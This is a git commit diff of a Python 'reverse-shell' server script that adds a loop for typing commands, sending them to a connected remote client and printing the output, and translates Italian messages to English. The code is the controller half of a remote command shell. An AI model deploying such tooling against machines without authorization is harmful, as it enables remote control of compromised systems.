1dac0f978368562620b31b51cc41e204ab66dfd6
vscalcione <vincenzo99.scalcione@gmail.com>
2020-03-20 23:48:14 +0100

    Fixing code of reverse shell

--- reverse-shell/server.py
+++ reverse-shell/server.py
@@ -1,28 +1,54 @@
 import socket
 import sys
 
+
+def send_commands(s, conn):
+    """Take a command typed by the user and send it to the client"""
+    print("\nCtrl + C to close the connection")
+    print("Navigate the system as usual with cd. ")
+    print("$: ", end="")
+    while True:
+        try:
+            cmd = input()
+            if len(cmd) > 0:
+                conn.sendall(cmd.encode())
+                data = conn.recv(4096)
+                print(data.decode("utf-8"), end="")
+        except KeyboardInterrupt:
+            print("\nA presto. ")
+            conn.close()
+            s.close()
+            sys.exit()
+        except Exception as e:
+            print(e)
+            conn.close()
+            s.close()
+            sys.exit()
+
+
 def server(address):
-    """Inizializza un server socket e attendi una connession"""
+    """Initialize a socket server and wait for a connection"""
     try:
         s = socket.socket()
         s.bind(address)
         s.listen()
-        print("Server Inizializzato. Sono in ascolto...")
+        print("Server initialized. I'm listening ...")
     except Exception as e:
-        print("\nSembra che qualcosa sia andato storto. ")
+        print("\nLooks like something went wrong. ")
         print(e)
-        restart = input("\nVuoi che reinizializzi il server? s/n ")
-        if restart.lower() == "s" or restart.lower() == "si":
-            print("\nRicevuto. Sto reinizializzando il server... \n")
+        restart = input("\nDo you want me to reinitialize the server? y/n ")
+        if restart.lower() == "y" or restart.lower() == "yes":
+            print("\nReceived. I'm reinitializing the server... \n")
             server(address)
         else:
-            print("\nA presto, ed Happy Coding! ;) \n")
+            print("\nSee you soon, and Happy Coding! ;) \n")
             sys.exit()
-    conn, client_addr = s.accept()
-    print(f"Connessione stabilita: {client_addr} ")
+    conn, client_address = s.accept()
+    print(f"Connection established: + {client_address}")
+    send_commands(s, conn)
+
 
 if __name__ == "__main__":
-    host = "192.168.233.1"
-    port = 19876
+    host = "192.168.1.26"
+    port = 19874
     server((host, port))
-
